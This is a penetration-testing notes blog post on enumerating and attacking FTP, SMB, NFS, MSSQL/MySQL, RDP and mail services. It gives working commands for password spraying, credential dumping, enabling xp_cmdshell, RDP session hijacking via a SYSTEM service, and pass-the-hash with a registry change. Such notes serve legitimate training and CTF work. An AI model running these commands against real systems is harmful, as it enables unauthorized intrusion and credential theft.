---
title: Notes | Common Services Enumeration & Attacks
author: BatBato
date: 2022-09-02
categories: [Notes, Footprinting, Common Services Enumeration& Attacks]
tags: [Common Services, Enumeration, Web, FTP, SMB, SMTP, POP3]
permalink: /Notes/Footprinting/Common_Services_Enumeration_&_Attacks
---

# Common Services Enumeration

## Web Enumeration

When you are looking at a web interface there is basically 3 things I advise you to do :
1. Read page content to find useful information
2. Read source code to find dev comments or information about plugins
3. Fuzz the website to find interesting files and/or directories

I'll leave you with the reading part and now we are going to look for the fuzzing part. It may not be very "stealthy" on a real live environment but it's pretty common in CTFs. If you like GUI, you can check the [Zap](https://www.zaproxy.org/docs/desktop/start/features/spider/) tool and especialy the spider/crawler section. But I'm going to go more in depth with two non graphical tools, ```ffuf``` and ```gobuster```.

### Ffuf / Gobuster

[ffuf](https://www.kali.org/tools/ffuf/) is a fest web fuzzer written in Go that allows typical directory discovery, virtual host discovery (without DNS records) and GET and POST parameter fuzzing. And [Gobuster](https://www.kali.org/tools/gobuster/) is a tool used to brute-force URIs including directories and files as well as DNS subdomains.

### Web Enumeration

First we are going to look for web pages and directories.
On ```gobuser``` you can find directories and web pages like this :

```console
gobuster dir -u http://SITE -w WORDLIST -x txt,php,html
```
> I advise you to use the ```/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt``` wordlist as a first attempt to find files or directories.
{: .prompt-tip }

On ```ffuf``` you can do so like this :

```console
ffuf  -u http://SITE/FUZZ -w WORDLIST -e .txt,.php,.html
```

> You can use recursion depth to look for files and directories in directories you find with fuff by adding the ```-recursion -recursion-depth 1``` option (it will do a recursion of 1 depth but you can increase this amount)
{: .prompt-tip }

> On both tools you can increase the scan speed by increasing the number of threads with the ```-t X``` option. Just replace the ```X``` with the number of threads that you want. I advise you not to go over ```50``` because it may cause errors or overheat the server.
{: .prompt-tip }

> The web fuzzing we have done can also be done with the ```intruder``` of ```Burp Suite```.
{: .prompt-info }

### POST / GET Fuzzing

With ```fuff``` you can fuzz POST and GET parameters. The easiest parameter to fuzz is the GET parameter because it's very similar to a web page or directory fuzzing.

```console
ffuf -u http://SITE/?id=FUZZ -w WORDLIST 
```

or

```console
ffuf -u http://SITE/?FUZZ=key -w WORDLIST 
```

This should result in many errors so you can stop it and rerun it with the ```-fs XXX``` option where ```XXX``` is the size you found on error results.

For the POST fuzzing parameter you can do it with the ```-d "PARAM=FUZZ``` or ```-d "FUZZ=VAL```:

```console
-X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded'
```

### Vhost & Subdomains

We already have seen how to discover VHosts in the [OSINT module](https://nouman404.github.io/Notes/Footprinting/OSINT#virtual-hosts-discovery). For subdomain enumeration it's much like POST and GET fuzzing :

```console 
ffuf -u https://FUZZ.example.com/ -w WORDLIST
```


>  If you don't have it yet you can download [Seclists](https://www.kali.org/tools/seclists/) with ```sudo apt install seclists```. You will find a lot of wordlist and the ones we are interested in here are the ones in the ```/usr/share/seclists/Discovery/DNS/``` directory. The ```subdomains-top1million-110000.txt``` is a pretty complete.
{: .prompt-tip }

> As you can see, ```ffuf``` is pretty versatile tool and can basically fuzz anything. You can also use it for brute force if you want, for example.
{: .prompt-info }

## FTP

File Transfert Protocol (FTP) is a standard communication protocol used for the transfer of files from a server to a client. To connect to an FTP server we can use the ```ftp IP -P PORT```command. The default FTP port is ```21``` so if you have the same port for the FTP server on the machine you are attacking then you don't have to specify the ```-P``` flag. When you run the command, you will be asked to connect with a ```username``` and ```password```. If you don't have such things, you can try to use the default ```anonymous``` user without a password. The ```anonymous``` connexion should be disabled but it's worth trying.

> The ```-sC``` of ```nmap``` can list files if anonymous login is enabled.
{: .prompt-tip }

> There may be hidden files so don't forget the ```-a``` flag of the ```ls``` command. The ```-R``` flag can also become handy to list files recursively.
{: .prompt-tip }

On an FTP server you can't read files like on a normal machine with ```cat``` or your preferred text editor. You'll have to download the file to read it locally. To download a file you can use the ```get FILE``` command and to upload a file the ```put FILE``` command. Whether it is for the ```get``` or the ```put``` command the default directory will be the one where the ```ftp``` command was launched. If you launched the command on the ```Desktop``` the files will be downloaded here and if the file you want to upload isn't on the desktop then you will need to specify its path.

> If you want information about ```FTP brute forcing``` you can check [this link](https://nouman404.github.io/Notes/Brute_Force/Brute_Force) 
{: .prompt-warning }

## SMB

"Server Message Block (SMB) is a communication protocol originally developed in 1983 by Barry A. Feigenbaum at IBM[2] and intended to provide shared access to files and printers across nodes on a network of systems running IBM's OS/2." Wikipedia. Originaly ```SMB``` used port ```139``` but in more recent version you can see port ```445```.

### List Shares

When you know that the machine has a ```SMB``` service running you may want to know which ```shares``` is available / readable. ```smbclient``` and ```smbmap``` are two great tools for this purpose.

```console
smbclient -N -L \\\\IP
```

> Note the ```-N``` flag that we use to specify ```no password``` and the ```-L``` option to list all shares.
{: .prompt-note }

> If you have already a user, you can specify it with the ```-U``` flag.
{: .prompt-tip }

or

```console
smbmap -H IP
```

> To specify a user and or password with ```smbmap``` you can use the ```-u``` and ```-p``` flags.
{: .prompt-tip }

> If you want to list files from a share recursively with ```smbmap``` you can use the ```-r SHARE``` flag (replace SHARE with the share you want to list).
{: .prompt-tip }

### Access Shares

Now that we know the shares we want to read, we can connect to the share folder.

```console
smbclient -U USER \\\\IP\\SHARE_NAME
```

Once connected, we can download or upload files like we've seen in the FTP section with ```get``` and ```put```. You can also use the ```cd``` and ```ls``` command to move in the share. With ```smbmap``` you can use the ```--download PATH/TO/FILE``` flag to download a file and the ```--upload SOURCE DESTINATION``` flag to upload a file.

> You can execute command on the share with ```smbmap``` with the ```-x "COMMAND"``` flag.
{: .prompt-tip }

Where password brute force may cause damage on the server (block accounts) we are attacking, passwords spraying can be stealthier and cause fewer damages. Instead of brute forcing a password we can try to find users with passwords very often used. You also can perform pâssword spraying with [Hydra](https://nouman404.github.io/Notes/Brute_Force/Brute_Force#hydra)

```console
crackmapexec smb IP -u USER_LIST -p 'Company01!'
```

> When you found valid credentials you can try dumping credentials with ```crackmapexec``` using the ```--sam```, ```--lsa``` or the ```--ntds``` flag.
{: .prompt-tip }

## NFS

```Network File System``` (NFS) is pretty similar to ```SMB``` but you can find the main differences in [this article](https://www.educba.com/nfs-vs-smb/).
It's running on port ```111``` but since it's last version (```NFSv4```) it uses one UDP and TCP port ```2049```.

> You can use the ```--script nfs*``` flag to have more details about the ```NFS shares``` in your [nmap](https://www.kali.org/tools/nmap/) scan.
{: .prompt-tip }

If you want to manually check for shares on a server, you can use the ```showmount``` command as follows :

```console
showmount -e IP
```

Now that you know the share name, you can mount it on your device by following this steps :
1. Create a directory where the share is going to be mounted :
```console
mkdir NFS_SHARE_DIR
```
2. Mount the remote share on your machine :
```console
mount -t nfs IP:REMOTE_SHARE ./NFS_SHARE_DIR/
```
3. Navigate and enumeate your mounted share
```console
cd NFS_SHARE_DIR
```

> If you want to unmount your newly created mounted share you can use the ```umount``` command like : ```umount ./NFS_SHARE_DIR```
{: .prompt-warning }

## SQL

There are many ```database management system``` (DBMS) but by default ```MSSQL``` uses port ```TCP/1433```, and ```MySQL``` uses ```TCP/3306```.

### Connection

To connect to MySQL and MSSQL is pretty similar. 

- MySQL :

**Linux**
```console
mysql -h DOMAIN_OR_IP -u USERNAME -pPASSWORD -P PORT DATABASE
```

> Note the if you don't know the databases that are on the host you can omit this parameter and select it after.
{: .prompt-tip }

> Note that there is no space between the ```-p``` flag and the password. You can use the ```-p``` flag without specifying the password at first and type it when asked.
{: .prompt-danger }

**Windows**
```console
sqlcmd -S DOMAIN_OR_IP -U USERNAME -P 'PASSWORD' -y 30 -Y 30
```

> The ```-y``` and ```-Y``` flag are used for better looking output.
{: .prompt-tip }

- MSSQL :

```console
sqsh -S DOMAIN_OR_IP -U SERVERNAME\\USERNAME -P 'PASSWORD' -h
```

> If you are looking for a local account you can put ```.\\USERNAME``` instead of giving a servername. 
{: .prompt-tip }

### SQL Commands

For the commands we will use, the mysql commands are easier to type and remember.

#### Show databases

- MySQL :

```console
SHOW DATABASES;
```

- MSSQL :

```console
1> SELECT name FROM master.dbo.sysdatabases
2> go
```

#### Select a Database

- MySQL :

```console
USE DATABASES;
```

- MSSQL :

```console
1> USE name FROM master.dbo.sysdatabases
2> go
```

#### Show Tables

- MySQL :

```console
SHOW TABLES;
```

- MSSQL :

```console
1> SELECT table_name FROM DATABASE_NAME.INFORMATION_SCHEMA.TABLES
2> go
```
> Don't forget to specify the ```DATABASE_NAME``` in MSSQL.
{: .prompt-warning  }

#### Select all Data from a Table

- MySQL :

```console
SELECT * FROM TABLE_NAME
```

- MSSQL :

```console
1> SELECT * FROM TABLE_NAME
2> go
```

### Execute Commands

With MSSQL you can execute command with ```xp_cmdshell``` by typing ```xp_cmdshell "COMMAND"```. 
```console
1> xp_cmdshell 'whoami'
2> go
```

Note that if ```xp_cmdshell``` is not enable and if you have sufficient rights you can ```enable it``` with the following commands :

1. To allow advanced options to be changed.

```console
1> EXECUTE sp_configure 'show advanced options', 1
2> go
```

2. To update the currently configured value for advanced options.  

```console
1> RECONFIGURE
2> go
```

3. To enable the feature.  

```console
1> EXECUTE sp_configure 'xp_cmdshell', 1
2> go
```

4. To update the currently configured value for this feature.  

```console
1> RECONFIGURE
2> go
```

### Impersonate Existing Users with MSSQL

The executing user can take the permissions of another user thanks to a particular privilege in SQL Server called ```IMPERSONATE```.
We must first find users who we can mimic. ```Sysadmins``` have the ability to impersonate anybody by default, but rights must be specifically granted to non-administrator users. In order to find users we can impersonate, we may perform the following query:

```console
1> SELECT distinct b.name
2> FROM sys.server_permissions a
3> INNER JOIN sys.server_principals b
4> ON a.grantor_principal_id = b.principal_id
5> WHERE a.permission_name = 'IMPERSONATE'
6> GO
```

Now if the user ```bob``` can be impersonate, we will execute the following command :

```console
1> EXECUTE AS LOGIN = 'bob'
2> SELECT SYSTEM_USER
3> SELECT IS_SRVROLEMEMBER('sysadmin')
4> go
```

### Communicate with Other Databases with MSSQL

Linked servers is a configuration option in MSSQL. A Transact-SQL query that contains tables from another instance of SQL Server, or another database product like Oracle, may generally be executed by the database engine thanks to linked servers, which are typically set up to support this.

1. Identify linked Servers in MSSQL

The following command will list [linked server](https://docs.microsoft.com/en-us/sql/relational-databases/linked-servers/create-linked-servers-sql-server-database-engine?view=sql-server-ver16) and mark remote servers with a ```1``` and local ones with a ```0```.

```console
1> SELECT srvname, isremote FROM sysservers
2> go
```

To execute commands on a linked server you can use the following command :

```console
EXECUTE ('CMD') AT [LINKED.SRV]	
```

Where ```CMD``` can be a SQL querry or xp_cmdshell like this :
```console
EXECUTE('xp_cmdshell ''type c:\Users\Administrator\Desktop\flag.txt''') AT [LINKED.SRV]
```
> Note that the single quotes (```'```) are important !
{: .prompt-warning  }

## RDP

"Remote Desktop Protocol (RDP) is a proprietary protocol developed by Microsoft which provides a user with a graphical interface to connect to another computer over a network connection." (Wikipedia). By default, the server listens on TCP and UDP on port 3389.

### RDP Password Spraying

If we are looking for usernames we may try the password spraying attack. As for any password spraying attack we can use [Hydra](https://nouman404.github.io/Notes/Brute_Force/Brute_Force#hydra) but for RDP we can also use [crowbar](https://www.kali.org/tools/crowbar/). The ```crowbar``` syntax is as follows if we want to spray the password ```password123``` on the whole network :

```console
crowbar -b rdp -s IP/32 -U USER_LIST -c 'password123'
```

### RDP connection

When you find yourself with valid credentials, you can connect to the distant machine using tools like [freerdp](https://www.kali.org/tools/freerdp2/#xfreerdp) or [remmina](https://remmina.org/). The full ```xfreerdp``` command where we share a local folder to upload our tools is as follows :

```console
xfreerdp /v:IP:PORT /u:USERNAME /p:PASSWORD /drive:SHARENAME,"PATH_TO_THE_FILES_TO_SHARE"
```

### RDP Session Hijacking

If we obtain access to a computer and have a ```local administrator account```. The user's remote desktop session can be ```hijacked``` in order to elevate our privileges and assume the user's identity if they are connecting via RDP to our hacked system. In an ```Active Directory``` setting, this can lead to us taking control of a ```Domain Admin account``` or gaining more access to the domain.

We can use the Powershell command ```query user``` to look for other connected users. If you already have a ```SYSTEM CMD``` opened you can lauch the command ```tscon TARGET_SESSION_ID /dest:OUR_SESSION_NAME```. 
If you don't have a ```SYSTEM CMD``` you can create a service that, by default, will run as ```local SYSTEM``` :

```console
sc.exe create sessionhijack binpath= "cmd.exe /k tscon TARGET_SESSION_ID /dest:OUR_SESSION_NAME"
```

This will launch our service called ```sessionhijack```.

```console
net start sessionhijack
```

### RDP Pass-the-Hash (PtH)

What is wonderful with RDP is that even if we only have the ```NT hash``` and not the clear text password, we can still connect to the machine with the ```Pass-the-Hash``` technique. To use ```xfreerdp``` fot the PtH attack you can do :

```console
xfreerdp /v:IP /u:USER /pth:HASH
```

This attack is only possible if the ```Restricted Admin Mode``` is enabled (it is disabled by default). A new registry key ```DisableRestrictedAdmin``` (REG DWORD) under ```HKEY_LOCAL_MACHINESystemCurrentControlSetControlLsa``` can be added to enable this. The command below can be used to accomplish it:

```console
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

## SMTP / POP3 / IMAP

All those protocols are used to allow people to receive and send mails. You can find the list of ports that they are using here :

| **Port** | **Service** |
| -------- | ----------- |
| TCP/25 | SMTP Unencrypted |
| TCP/143 |	IMAP4 Unencrypted |
| TCP/110 |	POP3 Unencrypted |
| TCP/465 |	SMTP Encrypted |
| TCP/993 |	IMAP4 Encrypted |
| TCP/995 |	POP3 Encrypted |

> Either for ```SMTP``` or ```POP3``` server you can try to ```brute force``` them or ```password spray``` them using [hydra](https://nouman404.github.io/Notes/Brute_Force/Brute_Force#hydra)
{: .prompt-tip }

### SMTP 

You can easily connect to a ```SMTP``` server with ```telnet``` using the command ```telnet IP 25```. You can use the commands ```VRFY```, ```EXPN```, and ```RCPT TO``` to enumerate users on the server. 

The ```VRFY``` command allows us to check for existing users and can be used like this ```VRFY root```. If the user ```root``` exist, then we will see a line containing this username like ```250 USERNAME```. If the user isn't found we may get the error code ```252```.

The ```EXPN``` command will list all users of a certain list. For example, if we type ```EXPN batbato``` we will get my email but if we type ```EXPN students``` we may get all emails that belongs to students.

```RCPT TO``` can be used to check the recipient of a mail. We try to send a mail to many users in order to find valid ones.

```console
MAIL FROM: Anyone@X.com
250 OK - (Server acknowledges and accepts)
RCPT TO: bob@X.dom
250 OK
```

Here we can see that ```bob``` is a valid user.

You can use tools such as [smtp-user-enum](https://www.kali.org/tools/smtp-user-enum/) to automate this process. The ```-M``` flag allows us to specify the method we want to use (```VRFY```, ```RCPT``` or ```EXPN```).

```console
smtp-user-enum -M RCPT -U USER_LIST -D DOMAIN -t IP
```

> You also can use tools such as ```Metaploit``` to automate your process. You can use modules like ```auxiliary/scanner/smtp/smtp_version``` or ```auxiliary/scanner/smtp/smtp_enum```.
{: .prompt-tip }

### POP3

The ```POP3``` can also be used to enumerate users. We can do so by using the ```USER``` command as follows :
```console
USER bob
+OK
USER bib
-ERR
```

The most useful commands are ```USER``` and ```PASS``` to connect to the server, ```LIST``` to list mails and ```RETR X``` to get the content of the mail ```X```.	But here is a list of useful ```POP3``` commands :


| **Command** | **Description** |
| ---------- | ---------- |
| USER username | Identifies the user. |
| PASS password | Authentication of the user using its password. |
| STAT | Requests the number of saved emails from the server. |
| LIST | Requests from the server the number and size of all emails. |
| RETR id | Requests the server to deliver the requested email by ID. |
| DELE id | Requests the server to delete the requested email by ID. |
| CAPA | Requests the server to display the server capabilities. |
| RSET | Requests the server to reset the transmitted information. |
| QUIT | Closes the connection with the POP3 server. |

> You can find more information about ```POP3``` commands on [this site](https://electrictoolbox.com/pop3-commands/).
{: .prompt-tip }

### IMAP 

As for ```SMTP``` and ```POP3``` you can execute bunch of commands on a ```IMAP``` server, here is a list of some that may help you :

| **Command** | **Description** |
| ---------- | ---------- |
| 1 LOGIN username password | User's login. |
| 1 LIST "" * | Lists all directories. |
| 1 CREATE "INBOX" | Creates a mailbox with a specified name. |
| 1 DELETE "INBOX" | Deletes a mailbox. |
| 1 RENAME "ToRead" "Important" | Renames a mailbox. |
| 1 LSUB "" * | Returns a subset of names from the set of names that the User has declared as being active or subscribed. |
| 1 SELECT INBOX | Selects a mailbox so that messages in the mailbox can be accessed. |
| 1 UNSELECT INBOX | Exits the selected mailbox. |
| 1 FETCH \<ID\> all | Retrieves data associated with a message in the mailbox. |
| tag FETCH \<ID\>:\<ID\> (BODY[HEADER]) | Get header of message |
| tag FETCH \<ID\> (BODY[n]) | Get the part number n of the body |
| 1 CLOSE | Removes all messages with the Deleted flag set. |
| 1 LOGOUT | Closes the connection with the IMAP server. |

### POP3s & IMAPs
  
If we encounter the encrypted version of ```POP3``` and ```IMAP```, we still can connect to it but not with ```telnet```. We can do so by using ```openssl``` :
  
```console
openssl s_client -connect IP:pop3s
```

> You can replace ```pop3s``` by ```imaps``` to connect to a ```IMAPs``` server.
{: .prompt-warning }


